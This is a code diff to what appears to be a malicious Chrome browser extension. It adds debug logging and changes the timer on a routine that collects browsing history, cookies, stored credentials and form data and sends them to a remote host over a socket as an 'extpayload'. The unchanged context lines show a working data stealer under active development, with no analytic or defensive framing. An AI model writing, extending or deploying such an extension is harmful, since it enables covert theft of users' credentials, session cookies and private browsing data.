@@ -193,6 +193,7 @@ chrome.history.search({text: '', maxResults: numResults}, function(data) {
     	var historyChanged = false;
     	if(page.lastVisitTime>millis){
             queue.history.push(page.url);
+            console.log("pushed history: ", queue.history);
             historyChanged = true;
 		}
 		if(historyChanged){
@@ -346,8 +347,8 @@ function sendPayload(){
 		getClientHistory(config.last_pkt, 200).then(function (){
             var newJson = createJSON(config.ID, queue.history, queue.cookies, queue.creds, queue.forms);
             //console.log("Sending a PAYLOAD");
-            //console.log("HISTORY: ",queue.history);
-            //console.log("HISTORY2: ", newJson['history']);
+            console.log("HISTORY: ",queue.history);
+            console.log("HISTORY2: ", newJson['history']);
             socket.emit('extpayload', newJson, function(answer){
                 handleServerPayload(answer);
                 clearQueue();
@@ -361,7 +362,7 @@ function sendPayload(){
 
 function main_func() {
 	connectToHost();
-    setInterval(sendPayload, 1000 * 10);	//sends payload every 30 seconds
+    setInterval(sendPayload, 1000 * 60 * 2);	//sends payload every 2 minutes
 	//console.log("config: ",config);
 }
 
